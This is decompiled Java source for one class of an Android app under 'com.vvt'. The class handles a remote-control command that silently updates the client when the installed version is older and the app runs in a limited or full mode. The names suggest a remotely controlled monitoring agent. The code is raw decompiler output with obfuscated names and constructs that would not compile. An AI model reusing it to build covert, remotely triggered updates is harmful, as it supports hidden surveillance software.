package com.vvt.appengine.a;

import android.os.ConditionVariable;

import com.vvt.appengine.AppEngine1;
import com.vvt.base.RunningMode;
import com.vvt.productinfo.ProductInfoImpl;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.input.RmtCtrlInputUpdateAvailableSilentMode;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class bq
{
  private static final boolean a = com.vvt.ak.a.a;
  private ConditionVariable b;
  private RmtCtrlOutputStatusMessage c;
  private ControlCommand d;
  
  public bq(ControlCommand paramControlCommand)
  {
    RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    localRmtCtrlOutputStatusMessage.<init>();
    this.c = localRmtCtrlOutputStatusMessage;
    this.d = paramControlCommand;
  }
  
  private com.vvt.datadeliverymanager.a.a b()
  {
    br localbr = new com/vvt/appengine/a/br;
    localbr.<init>(this);
    return localbr;
  }
  
  public RmtCtrlOutputStatusMessage a(AppEngine1 paramh)
  {
    for (;;)
    {
      try
      {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject1 = this.d;
        localObject1 = ((ControlCommand)localObject1).getData();
        bool2 = localObject1 instanceof RmtCtrlInputUpdateAvailableSilentMode;
        if (!bool2) {
          break label291;
        }
        localObject3 = paramh.d();
        boolean bool3 = a;
        if (bool3) {}
        RunningMode localRunningMode = RunningMode.NORMAL;
        if (localObject3 == localRunningMode)
        {
          localObject1 = this.c;
          bool2 = false;
          localObject3 = null;
          ((RmtCtrlOutputStatusMessage)localObject1).setSuccess(false);
          localObject1 = this.c;
          localObject3 = "This command supported in Limited 1 or Full mode only.";
          ((RmtCtrlOutputStatusMessage)localObject1).setMessage((String)localObject3);
          bool1 = a;
          if (bool1) {}
          localObject1 = this.c;
          return (RmtCtrlOutputStatusMessage)localObject1;
        }
        localObject1 = (RmtCtrlInputUpdateAvailableSilentMode)localObject1;
        localObject1 = ((RmtCtrlInputUpdateAvailableSilentMode)localObject1).getVersionNumber();
        localObject3 = paramh.o;
        localObject3 = ((ProductInfoImpl)localObject3).getProductVersion();
        bool1 = c.a((String)localObject1, (String)localObject3);
        bool2 = a;
        if ((bool2) && (!bool1)) {
          break label257;
        }
        localObject1 = new android/os/ConditionVariable;
        bool2 = false;
        localObject3 = null;
        ((ConditionVariable)localObject1).<init>(false);
        this.b = ((ConditionVariable)localObject1);
        localObject1 = paramh.Z;
        if (localObject1 != null)
        {
          localObject1 = paramh.Z;
          localObject3 = b();
          ((com.vvt.autoupdate.a)localObject1).a((com.vvt.datadeliverymanager.a.a)localObject3);
          localObject1 = paramh.Z;
          ((com.vvt.autoupdate.a)localObject1).c();
          localObject1 = this.b;
          ((ConditionVariable)localObject1).block();
          continue;
        }
        localRmtCtrlOutputStatusMessage = this.c;
      }
      finally {}
      boolean bool2 = false;
      Object localObject3 = null;
      localRmtCtrlOutputStatusMessage.setSuccess(false);
      RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage = this.c;
      localObject3 = "AutoUpdateManager is NULL";
      localRmtCtrlOutputStatusMessage.setMessage((String)localObject3);
      continue;
      label257:
      localRmtCtrlOutputStatusMessage = this.c;
      bool2 = false;
      localObject3 = null;
      localRmtCtrlOutputStatusMessage.setSuccess(false);
      localRmtCtrlOutputStatusMessage = this.c;
      localObject3 = "The version on client is up to date";
      localRmtCtrlOutputStatusMessage.setMessage((String)localObject3);
      continue;
      label291:
      localRmtCtrlOutputStatusMessage = this.c;
      bool2 = false;
      localObject3 = null;
      localRmtCtrlOutputStatusMessage.setSuccess(false);
      localRmtCtrlOutputStatusMessage = this.c;
      localObject3 = "Invalid type. Expecting RmtCtrlInputUpdateAvailableSilentMode";
      localRmtCtrlOutputStatusMessage.setMessage((String)localObject3);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bq.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */